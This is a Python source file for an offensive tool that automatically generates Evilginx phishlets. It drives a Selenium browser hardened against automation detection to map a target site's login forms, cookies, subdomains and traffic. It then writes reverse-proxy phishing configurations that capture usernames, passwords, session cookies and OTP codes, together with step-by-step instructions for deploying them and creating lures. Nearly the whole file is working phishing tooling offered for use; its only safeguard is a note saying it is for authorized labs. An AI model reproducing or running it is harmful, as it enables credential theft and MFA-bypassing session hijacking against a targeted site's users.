#!/usr/bin/env python3
"""
Stealthed Out Phishlet Generator - CDP Version with Selenium-Stealth
Supports Evilginx 1, 2, and 3
"""

import argparse
import sys
import time
import json
import yaml
import re
import os
from urllib.parse import urlparse, urljoin, parse_qs
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium_stealth import stealth
import colorama
from colorama import Fore, Style

colorama.init()

class UniversalPhishletGenerator:
    def __init__(self):
        self.target_url = ""
        self.evilginx_version = ""
        self.parsed_url = None
        self.domain = ""
        self.base_domain = ""
        self.analysis_depth = "2"
        
        # Data storage
        self.login_endpoints = []
        self.form_fields = {}
        self.cookies = []
        self.redirects = []
        self.subdomains = set()
        self.js_files = []
        self.proxy_hosts = []
        self.auth_tokens = []
        self.csrf_tokens = []
        
        # CDP Network Capture
        self.driver = None
        self.network_logs = []
        
    def display_banner(self):
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║     EVILGEN - CDP PHISHLET GENERATOR (Selenium-Stealth)          ║
║              Evilginx 1/2/3 Compatible                           ║
╠══════════════════════════════════════════════════════════════════╣
║  Uses Chrome DevTools Protocol + Selenium-Stealth                ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
    
    def interactive_setup(self):
        print(f"\n{Fore.YELLOW}[*] Interactive Setup Wizard{Style.RESET_ALL}")
        
        while True:
            url = input(f"\n{Fore.CYAN}[?] Target login URL: {Style.RESET_ALL}")
            if url.startswith(('http://', 'https://')):
                self.target_url = url
                self.parsed_url = urlparse(url)
                self.domain = self.parsed_url.netloc
                
                parts = self.domain.split('.')
                if len(parts) > 2:
                    self.base_domain = '.'.join(parts[-2:])
                else:
                    self.base_domain = self.domain
                break
            else:
                print(f"{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[?] Select Evilginx version:{Style.RESET_ALL}")
        print("  1) Evilginx 1.x")
        print("  2) Evilginx 2.x")
        print("  3) Evilginx 3.x")
        
        while True:
            choice = input(f"{Fore.CYAN}[>] Enter choice (1-3): {Style.RESET_ALL}")
            if choice in ['1', '2', '3']:
                self.evilginx_version = choice
                break
        
        print(f"\n{Fore.CYAN}[?] Analysis depth:{Style.RESET_ALL}")
        print("  1) Basic")
        print("  2) Standard")
        print("  3) Advanced")
        
        self.analysis_depth = input(f"{Fore.CYAN}[>] Choice (1-3, default 2): {Style.RESET_ALL}") or "2"
        return True
    
    def setup_browser(self):
        print(f"{Fore.CYAN}[*] Configuring browser with Selenium-Stealth...{Style.RESET_ALL}")
        
        options = webdriver.ChromeOptions()
        
        # Enable performance logging for network capture
        options.set_capability('goog:loggingPrefs', {'performance': 'ALL', 'browser': 'ALL'})
        
        # Stealth options
        options.add_argument('--start-maximized')
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--allow-running-insecure-content')
        options.add_argument('--disable-web-security')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--window-size=1920,1080')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        try:
            self.driver = webdriver.Chrome(options=options)
            
            # Apply selenium-stealth
            stealth(
                self.driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
                run_on_insecure_origins=True
            )
            
            # Enable CDP Network domain
            self.driver.execute_cdp_cmd('Network.enable', {})
            self.driver.execute_cdp_cmd('Page.enable', {})
            self.driver.execute_cdp_cmd('Network.setCacheDisabled', {'cacheDisabled': True})
            
            print(f"{Fore.GREEN}[+] Browser configured with Selenium-Stealth{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Browser setup failed: {e}{Style.RESET_ALL}")
            return False
    
    def capture_network_logs(self):
        """Capture network logs using performance logging"""
        try:
            logs = self.driver.get_log('performance')
            
            for log in logs:
                message = json.loads(log['message'])['message']
                self.network_logs.append(message)
                
        except Exception as e:
            pass
    
    def analyze_network_traffic(self):
        """Analyze captured network logs for login endpoints, cookies, and auth tokens"""
        print(f"\n{Fore.CYAN}[*] Analyzing network traffic...{Style.RESET_ALL}")
        
        for message in self.network_logs:
            method = message.get('method', '')
            params = message.get('params', {})
            
            # Handle response received events
            if method == 'Network.responseReceived':
                response = params.get('response', {})
                url = response.get('url', '')
                headers = response.get('headers', {})
                
                # Extract domain info
                parsed = urlparse(url)
                if self.base_domain in parsed.netloc:
                    self.subdomains.add(parsed.netloc)
                
                # Look for Set-Cookie headers
                if 'Set-Cookie' in headers:
                    cookie_str = headers['Set-Cookie']
                    self.parse_cookie_from_header(cookie_str, parsed.netloc)
                
                # Look for auth tokens in headers
                auth_headers = ['Authorization', 'X-Auth-Token', 'X-CSRF-Token']
                for header in auth_headers:
                    if header in headers:
                        print(f"{Fore.GREEN}[+] Auth header found: {header}{Style.RESET_ALL}")
                        self.auth_tokens.append({
                            'type': 'header',
                            'name': header,
                            'value': headers[header]
                        })
            
            # Handle request will be sent events
            elif method == 'Network.requestWillBeSent':
                request = params.get('request', {})
                url = request.get('url', '')
                method_http = request.get('method', '')
                
                # Look for login endpoints
                if method_http == 'POST':
                    login_keywords = ['login', 'auth', 'signin', 'authenticate', 'session']
                    if any(keyword in url.lower() for keyword in login_keywords):
                        print(f"{Fore.GREEN}[+] Potential login endpoint: {url}{Style.RESET_ALL}")
                        post_data = request.get('postData', '')
                        if post_data:
                            self.extract_post_params(post_data)
    
    def parse_cookie_from_header(self, cookie_str, domain):
        """Parse Set-Cookie header from network logs"""
        try:
            cookie_parts = cookie_str.split(';')
            name_value = cookie_parts[0].split('=', 1)
            if len(name_value) >= 2:
                cookie_name = name_value[0].strip()
                
                existing = [c for c in self.cookies if c['name'] == cookie_name]
                if not existing:
                    cookie_data = {
                        'name': cookie_name,
                        'domain': domain,
                        'httponly': 'HttpOnly' in cookie_str,
                        'secure': 'Secure' in cookie_str,
                        'session': 'Expires' not in cookie_str and 'Max-Age' not in cookie_str
                    }
                    self.cookies.append(cookie_data)
                    print(f"{Fore.GREEN}[+] Cookie found: {cookie_name}{Style.RESET_ALL}")
        except Exception as e:
            pass
    
    def extract_post_params(self, post_data):
        """Extract parameters from POST data"""
        try:
            # Try parsing as form data
            if '&' in post_data or '=' in post_data:
                params = parse_qs(post_data)
                for key in params:
                    if 'pass' in key.lower():
                        self.form_fields['password'] = key
                        print(f"{Fore.GREEN}[+] Password field from traffic: {key}{Style.RESET_ALL}")
                    elif any(kw in key.lower() for kw in ['user', 'email', 'login', 'username']):
                        self.form_fields['username'] = key
                        print(f"{Fore.GREEN}[+] Username field from traffic: {key}{Style.RESET_ALL}")
                    elif any(kw in key.lower() for kw in ['csrf', 'token', 'authenticity']):
                        self.csrf_tokens.append(key)
                        print(f"{Fore.GREEN}[+] CSRF token from traffic: {key}{Style.RESET_ALL}")
        except Exception as e:
            pass
    
    def analyze_page_structure(self):
        print(f"\n{Fore.CYAN}[*] Analyzing page structure...{Style.RESET_ALL}")
        
        time.sleep(3)
        
        try:
            title = self.driver.title
            print(f"{Fore.YELLOW}[i] Page title: {title}{Style.RESET_ALL}")
            
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            print(f"{Fore.GREEN}[+] Found {len(forms)} form(s){Style.RESET_ALL}")
            
            for i, form in enumerate(forms):
                self.analyze_form(form, i)
            
            self.find_alternative_login_methods()
            
            if self.analysis_depth in ['2', '3']:
                self.analyze_javascript()
            
            # Capture and analyze network logs
            self.capture_network_logs()
            self.analyze_network_traffic()
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Page analysis error: {e}{Style.RESET_ALL}")
            return False
    
    def analyze_form(self, form, form_index):
        try:
            form_data = {
                'action': form.get_attribute('action') or '',
                'method': form.get_attribute('method') or 'get',
                'id': form.get_attribute('id'),
                'class': form.get_attribute('class'),
                'fields': []
            }
            
            inputs = form.find_elements(By.TAG_NAME, 'input')
            for inp in inputs:
                field_info = {
                    'name': inp.get_attribute('name') or '',
                    'type': inp.get_attribute('type') or 'text',
                    'id': inp.get_attribute('id') or '',
                    'placeholder': inp.get_attribute('placeholder') or ''
                }
                form_data['fields'].append(field_info)
                self.classify_field(field_info)
            
            buttons = form.find_elements(By.TAG_NAME, 'button')
            for btn in buttons:
                form_data['fields'].append({
                    'name': '',
                    'type': 'button',
                    'text': btn.text or ''
                })
            
            print(f"\n{Fore.YELLOW}[i] Form {form_index + 1}:{Style.RESET_ALL}")
            print(f"    Action: {form_data['action']}")
            print(f"    Method: {form_data['method']}")
            
            for field in form_data['fields']:
                if field['name']:
                    print(f"      - {field['name']} ({field['type']})")
            
            self.login_endpoints.append({
                'form_index': form_index,
                'url': urljoin(self.target_url, form_data['action']),
                'method': form_data['method'].upper(),
                'fields': form_data['fields']
            })
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error analyzing form: {e}{Style.RESET_ALL}")
    
    def classify_field(self, field_info):
        name_lower = field_info['name'].lower()
        type_lower = field_info['type'].lower()
        
        username_patterns = ['user', 'email', 'login', 'account', 'name', 'uname']
        if any(pattern in name_lower for pattern in username_patterns) or type_lower == 'email':
            self.form_fields['username'] = field_info['name'] or 'username'
            print(f"{Fore.GREEN}[+] Username field: {field_info['name']}{Style.RESET_ALL}")
        
        password_patterns = ['pass', 'pwd', 'secret', 'password']
        if any(pattern in name_lower for pattern in password_patterns) or type_lower == 'password':
            self.form_fields['password'] = field_info['name'] or 'password'
            print(f"{Fore.GREEN}[+] Password field: {field_info['name']}{Style.RESET_ALL}")
        
        csrf_patterns = ['csrf', 'token', 'authenticity', 'nonce', 'state', '_token']
        if any(pattern in name_lower for pattern in csrf_patterns):
            self.csrf_tokens.append(field_info['name'])
            print(f"{Fore.GREEN}[+] CSRF token field: {field_info['name']}{Style.RESET_ALL}")
        
        if type_lower in ['submit', 'button']:
            self.form_fields['submit'] = field_info['name'] or 'submit'
    
    def find_alternative_login_methods(self):
        try:
            oauth_selectors = [
                "a[href*='oauth']",
                "a[href*='auth']",
                "a[href*='google']",
                "a[href*='facebook']",
                "a[href*='github']",
                "a[href*='microsoft']",
                "a[href*='apple']"
            ]
            
            for selector in oauth_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for elem in elements:
                        href = elem.get_attribute('href') or ''
                        text = elem.text or ''
                        if href or text:
                            print(f"{Fore.YELLOW}[i] Alternative login found: {text} -> {href}{Style.RESET_ALL}")
                except:
                    continue
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Error finding alternative logins: {e}{Style.RESET_ALL}")
    
    def analyze_javascript(self):
        try:
            scripts = self.driver.find_elements(By.TAG_NAME, 'script')
            for script in scripts:
                src = script.get_attribute('src')
                if src:
                    self.js_files.append(src)
            
            auth_keywords = ['auth', 'login', 'oauth', 'token', 'session', 'jwt', 'api']
            for js_file in self.js_files:
                if any(keyword in js_file.lower() for keyword in auth_keywords):
                    print(f"{Fore.GREEN}[+] Auth-related JS: {js_file}{Style.RESET_ALL}")
            
            # Also check inline scripts for API endpoints
            inline_scripts = self.driver.find_elements(By.XPATH, "//script[not(@src)]")
            for script in inline_scripts:
                text = script.get_attribute('innerHTML') or ''
                api_patterns = re.findall(r'["\'](https?://[^"\']+api[^"\']*)["\']', text)
                for api in api_patterns:
                    print(f"{Fore.GREEN}[+] API endpoint found in JS: {api}{Style.RESET_ALL}")
                    
        except Exception as e:
            print(f"{Fore.RED}[!] JS analysis error: {e}{Style.RESET_ALL}")
    
    def monitor_traffic(self, duration=30):
        print(f"\n{Fore.CYAN}[*] Monitoring network traffic for {duration} seconds...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Please manually interact with the login page{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Try to log in with test credentials{Style.RESET_ALL}")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            self.capture_network_logs()
            time.sleep(1)
        
        self.analyze_network_traffic()
        print(f"{Fore.GREEN}[+] Traffic monitoring complete{Style.RESET_ALL}")
    
    def generate_evilginx1_phishlet(self):
        phishlet = {
            'name': self.base_domain.replace('.', '_'),
            'author': 'UniversalPhishletGenerator',
            'version': '1.0',
            'proxy_pass': f'https://{self.base_domain}',
            'proxy_host': self.base_domain,
            'phish_sub': 'login',
            'keys': [],
            'login': {
                'path': self.parsed_url.path,
                'username_key': self.form_fields.get('username', 'username'),
                'password_key': self.form_fields.get('password', 'password')
            }
        }
        
        for cookie in self.cookies:
            phishlet['keys'].append(cookie['name'])
        
        for csrf in self.csrf_tokens:
            phishlet['keys'].append(csrf)
        
        return phishlet
    
    def generate_evilginx2_phishlet(self):
        phishlet = {
            'name': self.base_domain.replace('.', '_'),
            'author': 'UniversalPhishletGenerator',
            'min_ver': '2.3',
            'proxy_hosts': [],
            'sub_filters': [],
            'auth_tokens': [],
            'login': {},
            'credentials': {}
        }
        
        subdomains_list = list(self.subdomains) if self.subdomains else [self.base_domain]
        for subdomain in subdomains_list:
            phish_sub = subdomain.split('.')[0] if '.' in subdomain else 'www'
            orig_sub = subdomain.replace(f'.{self.base_domain}', '')
            if orig_sub == subdomain:
                orig_sub = 'www'
            
            phishlet['proxy_hosts'].append({
                'phish_sub': phish_sub,
                'orig_sub': orig_sub,
                'domain': self.base_domain,
                'session': True,
                'is_landing': ('login' in phish_sub or 'auth' in phish_sub or 'account' in phish_sub)
            })
        
        domain_regex = re.escape(self.base_domain)
        phishlet['sub_filters'].append({
            'domain': self.base_domain,
            'sub': '.*',
            'mimes': ['text/html', 'application/javascript', 'text/css', 'application/json'],
            'regexp': f'(https?://)((www|login|auth|account|secure)\\.)?{domain_regex}',
            'redirect': 'https://{{hostname}}',
            'replace': r'https://{hostname}'
        })
        
        if self.cookies:
            cookie_domains = set(c['domain'] for c in self.cookies)
            for cookie_domain in cookie_domains:
                keys = [c['name'] for c in self.cookies if c['domain'] == cookie_domain]
                if keys:
                    phishlet['auth_tokens'].append({
                        'domain': f'.{self.base_domain}' if cookie_domain == self.base_domain else cookie_domain,
                        'keys': keys
                    })
        
        if self.login_endpoints:
            endpoint = self.login_endpoints[0]
            phishlet['login'] = {
                'domain': self.base_domain,
                'path': urlparse(endpoint['url']).path,
                'username_field': self.form_fields.get('username', 'username'),
                'password_field': self.form_fields.get('password', 'password'),
                'submit_field': self.form_fields.get('submit', ''),
                'capture_fields': []
            }
        else:
            phishlet['login'] = {
                'domain': self.base_domain,
                'path': self.parsed_url.path,
                'username_field': self.form_fields.get('username', 'username'),
                'password_field': self.form_fields.get('password', 'password'),
                'submit_field': '',
                'capture_fields': []
            }
        
        phishlet['credentials'] = {
            'username': {
                'key': self.form_fields.get('username', 'username'),
                'search': '(?i)(email|username|login|user|account)',
                'type': 'post'
            },
            'password': {
                'key': self.form_fields.get('password', 'password'),
                'search': '(?i)(password|pass|pwd|secret)',
                'type': 'post'
            }
        }
        
        for csrf in self.csrf_tokens:
            phishlet['credentials'][f'csrf_{csrf}'] = {
                'key': csrf,
                'search': f'(?i){re.escape(csrf)}',
                'type': 'post'
            }
        
        return phishlet
    
    def generate_evilginx3_phishlet(self):
        phishlet = {
            'name': self.base_domain.replace('.', '_'),
            'author': 'UniversalPhishletGenerator',
            'description': f'Phishlet for {self.base_domain}',
            'min_ver': '3.0.0',
            'proxy_hosts': [],
            'transformations': [],
            'credentials': {},
            'tokens': [],
            'landing_paths': []
        }
        
        subdomains_list = list(self.subdomains) if self.subdomains else [self.base_domain]
        for subdomain in subdomains_list:
            host_entry = {
                'phish_sub': subdomain.split('.')[0] if '.' in subdomain else '',
                'orig_sub': subdomain.replace(f'.{self.base_domain}', ''),
                'domain': self.base_domain
            }
            
            if any(x in subdomain.lower() for x in ['login', 'auth', 'account', 'secure']):
                host_entry['is_landing'] = True
                phishlet['landing_paths'].append(self.parsed_url.path)
            
            phishlet['proxy_hosts'].append(host_entry)
        
        domain_regex = re.escape(self.base_domain)
        phishlet['transformations'].append({
            'type': 'regex',
            'target': 'response',
            'content_type': ['text/html', 'application/javascript', 'text/css'],
            'pattern': f'(https?://)((www|login|auth|account)\\.)?{domain_regex}',
            'replacement': 'https://{hostname}'
        })
        
        phishlet['transformations'].append({
            'type': 'regex',
            'target': 'response',
            'content_type': ['text/html'],
            'pattern': 'action=["\'][^"\']*["\']',
            'replacement': 'action="/"'
        })
        
        for cookie in self.cookies:
            token_entry = {
                'type': 'cookie',
                'name': cookie['name'],
                'domain': f'.{self.base_domain}',
                'match': '.*',
                'capture': True
            }
            phishlet['tokens'].append(token_entry)
        
        phishlet['credentials'] = {
            'username': {
                'key': self.form_fields.get('username', 'username'),
                'patterns': [
                    {'type': 'post', 'pattern': '(?i)(email|username|login)'},
                    {'type': 'json', 'pattern': '(?i)(user|login).*name'}
                ]
            },
            'password': {
                'key': self.form_fields.get('password', 'password'),
                'patterns': [
                    {'type': 'post', 'pattern': '(?i)(password|pass|pwd)'},
                    {'type': 'json', 'pattern': '(?i)pass'}
                ]
            }
        }
        
        if self.analysis_depth == '3':
            phishlet['credentials']['otp_code'] = {
                'key': 'otp_code',
                'patterns': [
                    {'type': 'post', 'pattern': '(?i)(otp|code|2fa|totp|verification)'}
                ]
            }
        
        return phishlet
    
    def generate_phishlet(self):
        print(f"\n{Fore.CYAN}[*] Generating Evilginx {self.evilginx_version}.x phishlet...{Style.RESET_ALL}")
        
        if self.evilginx_version == '1':
            phishlet = self.generate_evilginx1_phishlet()
            filename = f"{self.base_domain.replace('.', '_')}_v1.yaml"
        elif self.evilginx_version == '2':
            phishlet = self.generate_evilginx2_phishlet()
            filename = f"{self.base_domain.replace('.', '_')}_v2.yaml"
        else:
            phishlet = self.generate_evilginx3_phishlet()
            filename = f"{self.base_domain.replace('.', '_')}_v3.yaml"
        
        self.save_phishlet(phishlet, filename)
        self.generate_instructions(filename, phishlet)
        
        return filename, phishlet
    
    def save_phishlet(self, phishlet, filename):
        with open(filename, 'w') as f:
            f.write(f"# Auto-generated phishlet for {self.base_domain}\n")
            f.write(f"# Generated by UniversalPhishletGenerator (Selenium-Stealth Version)\n")
            f.write(f"# Target URL: {self.target_url}\n")
            f.write(f"# Evilginx version: {self.evilginx_version}.x\n")
            f.write(f"# Time: {time.ctime()}\n")
            f.write(f"# Use only in authorized lab environments\n\n")
            
            yaml.dump(phishlet, f, default_flow_style=False, sort_keys=False, allow_unicode=True)
        
        print(f"{Fore.GREEN}[+] Phishlet saved to: {filename}{Style.RESET_ALL}")
    
    def generate_instructions(self, filename, phishlet):
        instr_file = filename.replace('.yaml', '_instructions.txt')
        
        instructions = f"""
=== PHISHLET INSTALLATION INSTRUCTIONS ===
Generated: {time.ctime()}
Target: {self.target_url}
Evilginx Version: {self.evilginx_version}.x
Phishlet: {filename}

1. COPY PHISHLET:
   sudo cp {filename} /usr/local/share/evilginx/phishlets/
   
2. START EVILGINX:
   sudo evilginx

3. CONFIGURE:
"""

        if self.evilginx_version == '1':
            instructions += f"""
   > set domain your-phishing-domain.com
   > set ip 127.0.0.1
   > phishlet load {phishlet['name']}
   > phishlet enable {phishlet['name']}
"""
        elif self.evilginx_version == '2':
            instructions += f"""
   > config domain your-phishing-domain.com
   > config ip 127.0.0.1
   > phishlets hostname {phishlet['name']} your-phishing-domain.com
   > phishlets enable {phishlet['name']}
"""
        else:
            instructions += f"""
   > config domain your-phishing-domain.com
   > config ip 127.0.0.1
   > phishlets import {filename}
   > phishlets enable {phishlet['name']}
"""

        instructions += f"""
4. CREATE LURE:
   > lures create {phishlet['name']}
   > lures edit 0 path /login
   > lures get-url 0

5. IMPORTANT NOTES:
   - Replace 'your-phishing-domain.com' with your actual domain
   - Ensure DNS records point to your Evilginx server
   - Use only in authorized penetration testing environments
   
DETECTED COMPONENTS:
- Login Fields: {self.form_fields}
- Cookies: {[c['name'] for c in self.cookies]}
- CSRF Tokens: {self.csrf_tokens}
- Subdomains: {list(self.subdomains)}
"""

        with open(instr_file, 'w') as f:
            f.write(instructions)
        
        print(f"{Fore.GREEN}[+] Instructions saved to: {instr_file}{Style.RESET_ALL}")
    
    def cleanup(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
    
    def run(self):
        try:
            self.display_banner()
            
            if not self.interactive_setup():
                return False
            
            if not self.setup_browser():
                print(f"{Fore.RED}[!] Failed to setup browser. Exiting.{Style.RESET_ALL}")
                return False
            
            print(f"\n{Fore.CYAN}[*] Navigating to {self.target_url}...{Style.RESET_ALL}")
            self.driver.get(self.target_url)
            
            self.analyze_page_structure()
            
            if self.analysis_depth in ['2', '3']:
                self.monitor_traffic(30)
            
            self.generate_phishlet()
            
            print(f"\n{Fore.GREEN}[+] Analysis complete!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Check the generated .yaml and _instructions.txt files{Style.RESET_ALL}")
            
            return True
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            return False
        finally:
            self.cleanup()


def main():
    parser = argparse.ArgumentParser(description='Universal Phishlet Generator (Selenium-Stealth Version)')
    parser.add_argument('--url', help='Target URL to analyze')
    parser.add_argument('--version', choices=['1', '2', '3'], help='Evilginx version')
    parser.add_argument('--depth', choices=['1', '2', '3'], default='2', help='Analysis depth')
    
    args = parser.parse_args()
    
    generator = UniversalPhishletGenerator()
    
    if args.url and args.version:
        generator.target_url = args.url
        generator.parsed_url = urlparse(args.url)
        generator.domain = generator.parsed_url.netloc
        
        parts = generator.domain.split('.')
        if len(parts) > 2:
            generator.base_domain = '.'.join(parts[-2:])
        else:
            generator.base_domain = generator.domain
            
        generator.evilginx_version = args.version
        generator.analysis_depth = args.depth
        
        generator.display_banner()
        
        if not generator.setup_browser():
            sys.exit(1)
        
        print(f"\n{Fore.CYAN}[*] Navigating to {generator.target_url}...{Style.RESET_ALL}")
        generator.driver.get(generator.target_url)
        
        generator.analyze_page_structure()
        
        if generator.analysis_depth in ['2', '3']:
            generator.monitor_traffic(30)
        
        generator.generate_phishlet()
        generator.cleanup()
    else:
        generator.run()


if __name__ == '__main__':
    main()